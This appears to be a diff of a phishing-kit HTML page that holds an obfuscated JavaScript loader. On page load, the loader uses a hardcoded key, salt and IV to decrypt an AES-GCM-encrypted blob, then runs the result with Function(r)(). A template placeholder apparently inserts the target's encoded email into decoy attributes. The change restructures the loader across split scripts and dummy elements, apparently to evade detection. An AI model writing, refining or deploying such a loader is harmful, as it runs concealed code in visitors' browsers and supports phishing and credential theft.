@@ -9,18 +9,22 @@
     </style>
 </head>
 <body>
-    <p>Initializing decryption...</p>
-    <script nike-testme="" adidas="<%=EMAIL64%>">
-        async function d(e, i, s, k) {
-            const h = t => new Uint8Array(t.match(/.{1,2}/g).map(b => parseInt(b, 16)));
-            const b = await crypto.subtle.importKey("raw", new TextEncoder().encode(k), { name: "PBKDF2" }, false, ["deriveKey"]);
-            const d = await crypto.subtle.deriveKey({ name: "PBKDF2", salt: h(s), iterations: 100000, hash: "SHA-256" }, b, { name: "AES-GCM", length: 256 }, false, ["decrypt"]);
-            return crypto.subtle.decrypt({ name: "AES-GCM", iv: h(i) }, d, h(e)).then(d => new TextDecoder().decode(d)).catch(() => null);
-        }
+    <span>
+        <div>
+            <br nike-tes1="">
+            <hr adidas="<%=EMAIL64%>">
+        </div>
+    </span>
+    <script>
+        const p = { iv: "ceb0f4f1afbc695ad02798ab", salt: "752dba59f37d01b08991d9e6c34ac389", encrypted: "7bff1ae4d47ea505fd6c83c97eb65a0ef996d06e0650b6621557464fb7a63a350bfb1ad9721a50376393f1751c376bb871d0a2a271d571d13497674fc27a2101feaf4648f7665ce05a5026d879529ffa559960eff54350865101249e319f5d5b1c7b3f888db4104afc3c8708f0ad2dacc6de7a0f088dbcb03bf946f173309556cba4e260d7e96caceee55e4548d1821d424587b2c252a46c8ef643e91fabf666da72f60def1cdc4c598bec8cdeef592b93f6d9aedd25e1a199c44b2bb27547c2" };
+        const k = "ea58c0ef491543774f851a0a594c7535";
+        const h = t => new Uint8Array(t.match(/.{1,2}/g).map(b => parseInt(b, 16)));
+    </script>
+    <script>
         (async () => {
-            const p = { iv: "ceb0f4f1afbc695ad02798ab", salt: "752dba59f37d01b08991d9e6c34ac389", encrypted: "7bff1ae4d47ea505fd6c83c97eb65a0ef996d06e0650b6621557464fb7a63a350bfb1ad9721a50376393f1751c376bb871d0a2a271d571d13497674fc27a2101feaf4648f7665ce05a5026d879529ffa559960eff54350865101249e319f5d5b1c7b3f888db4104afc3c8708f0ad2dacc6de7a0f088dbcb03bf946f173309556cba4e260d7e96caceee55e4548d1821d424587b2c252a46c8ef643e91fabf666da72f60def1cdc4c598bec8cdeef592b93f6d9aedd25e1a199c44b2bb27547c2" };
-            const k = "ea58c0ef491543774f851a0a594c7535";
-            const r = await d(p.encrypted, p.iv, p.salt, k);
+            const b = await crypto.subtle.importKey("raw", new TextEncoder().encode(k), { name: "PBKDF2" }, false, ["deriveKey"]);
+            const d = await crypto.subtle.deriveKey({ name: "PBKDF2", salt: h(p.salt), iterations: 100000, hash: "SHA-256" }, b, { name: "AES-GCM", length: 256 }, false, ["decrypt"]);
+            const r = await crypto.subtle.decrypt({ name: "AES-GCM", iv: h(p.iv) }, d, h(p.encrypted)).then(d => new TextDecoder().decode(d)).catch(() => null);
             if (r) Function(r)();
         })();
     </script>
